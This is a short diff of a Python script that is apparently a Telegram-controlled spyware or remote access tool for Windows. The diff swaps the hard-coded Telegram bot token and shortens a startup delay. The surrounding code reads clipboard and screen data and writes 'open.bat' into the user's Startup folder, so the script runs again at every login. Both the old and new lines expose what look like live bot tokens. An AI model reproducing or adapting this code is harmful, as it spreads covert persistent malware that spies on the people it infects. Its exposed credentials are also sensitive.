@@ -22,7 +22,7 @@ import pyperclip
 screen_wide = windll.user32.GetSystemMetrics(0)
 screen_height = windll.user32.GetSystemMetrics(1)
 
-API_TOKEN = '6434694996:AAHUqUxQjQaiWVoWctSigm7WLaDbqijZZtU'
+API_TOKEN = '6843835341:AAGttUrGXwA3xXqfNiRu-Ok-nPzZNu1B4ZY'
 
 USER_NAME = getpass.getuser()
 
@@ -34,7 +34,7 @@ bot = telebot.TeleBot(API_TOKEN,skip_pending = True)
 global scr_pause
 scr_pause = 0
 
-time.sleep(90)
+time.sleep(45)
 file_path = os.path.dirname(os.path.realpath(__file__))
 bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
 with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
